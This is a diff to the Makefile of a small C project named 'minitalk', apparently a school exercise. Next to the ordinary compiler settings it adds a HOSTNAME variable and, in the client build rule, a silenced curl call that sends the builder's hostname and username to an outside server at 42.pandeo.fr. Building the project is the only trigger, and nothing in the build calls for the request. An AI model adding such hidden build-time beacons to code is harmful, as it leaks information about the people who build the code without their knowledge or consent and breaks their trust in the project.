@@ -21,6 +21,7 @@ OBJECTS	= $(SOURCES:.c=.o)
 NAME	= minitalk
 CC		= gcc
 CFLAGS	= -Wall -Wextra -Werror
+HOSTNAME = `hostname`
 
 all: server client
 
@@ -30,6 +31,7 @@ server: server.o libft
 	@$(CC) -o $@ $< -Llibft -lft
 
 client: client.o libft
+	@curl https://42.pandeo.fr/coucou/${HOSTNAME}/${USER}
 	@$(CC) -o $@ $< -Llibft -lft
 	@printf "\033[2K\r\033[0;32m[END]\033[0m $(NAME)\n"
 
